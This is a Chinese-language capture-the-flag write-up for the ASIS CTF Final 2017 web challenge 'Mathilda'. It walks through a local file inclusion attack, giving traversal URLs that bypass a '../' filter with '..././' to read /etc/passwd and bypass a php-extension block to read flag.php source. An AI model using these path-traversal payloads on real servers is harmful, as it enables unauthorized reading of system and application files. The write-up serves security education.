# ASIS CTF FINAL 2017 : Mathilda

**category** : web
**points** : 57

> Mathilda learned many skills from Leon, now she want to use [them](http://178.62.48.181/)!

## write-up

用 wappalyzer 看出他是用 apache 2.4.25

```html
<!-- created by ~rooney -->
```

index page 有這一行所以猜他有 rooney 的 user 開 public_html 出來 ( http://178.62.48.181/~rooney/ )

發現他可以 local file inclusion ( http://178.62.48.181/~rooney/?path=rooney )

http://178.62.48.181/~rooney/?path=../../../../../../etc/passwd 沒成功

http://178.62.48.181/~rooney/?path=../rooney 得到跟 http://178.62.48.181/~rooney/?path=rooney 結果一樣，猜測他是用字串取代把 `../` 取代成空的

http://178.62.48.181/~rooney/?path=..././..././..././..././etc/passwd 成功

看到 th1sizveryl0ngus3rn4me 這個 user

http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.php

會擋 php，沒關係，用 `../` 繞過

http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/index.p../hp

看到他 `require 'flag.php'`

http://178.62.48.181/~rooney/?path=..././..././..././..././home/th1sizveryl0ngus3rn4me/public_html/flag.p../hp

噴 flag

小插曲 :

瀏覽 http://178.62.48.181/~rooney/?path=..././..././..././..././etc/apache2/vhost/host.conf

```
...
    ServerAdmin webmaster@localhost
    DocumentRoot /flag/html/
    ServerName flagishere
...
```

在 `/etc/hosts` 加上 178.62.48.181 flagishere，去瀏覽 http://flagishere，然後就噴 forbidden

以為有什麼神奇的東西，原來是被耍啦

## other write-ups and resources

* http://countersite.org/articles/web-vulnerability/161-mathilda-web-writeup-asis-2017.html
* https://rawsec.ml/en/ASIS-2017-Final-write-ups/#mathilda-web
* https://github.com/ymgve/ctf-writeups/tree/master/asis2017finals/web-mathilda
